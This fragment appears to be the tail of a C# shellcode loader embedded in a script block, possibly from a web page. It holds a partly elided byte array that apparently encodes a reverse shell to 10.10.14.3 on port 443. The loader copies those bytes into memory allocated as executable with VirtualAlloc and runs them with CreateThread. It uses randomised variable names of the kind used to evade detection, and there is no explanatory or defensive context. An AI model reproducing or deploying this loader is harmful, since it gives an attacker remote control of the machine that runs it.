...
0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x0a,0x0a,0x0e,0x03,0x68,0x02,0x00,0x01,0xbb,0x89,
...
0x3f,0x86,0xff,0xd5,0x89,0xe0,0x4e,0x56,0x46,0xff,0x30,0x68,0x08,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,
0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5 };

        IntPtr jn6tFCem9 = VirtualAlloc(IntPtr.Zero,(UIntPtr)z2L3tWLEgE.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(z2L3tWLEgE,0,jn6tFCem9,z2L3tWLEgE.Length);
        IntPtr kZBr4dJ = IntPtr.Zero;
        IntPtr hr4e9YMC8 = CreateThread(IntPtr.Zero,UIntPtr.Zero,jn6tFCem9,IntPtr.Zero,0,ref kZBr4dJ);
    }
</script>
